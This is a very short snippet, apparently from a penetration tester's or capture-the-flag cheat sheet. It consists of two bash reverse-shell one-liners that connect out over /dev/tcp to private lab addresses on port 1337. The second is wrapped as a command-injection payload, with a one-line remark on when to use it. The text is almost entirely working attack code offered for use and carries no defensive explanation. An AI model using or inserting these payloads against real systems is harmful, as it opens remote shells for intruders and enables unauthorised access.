/bin/bash -i >& /dev/tcp/10.10.14.106/1337 0>&1

e.g. if code injection is possible:
$(bash -c '/bin/bash -i >& /dev/tcp/10.10.14.211/1337 0>&1')
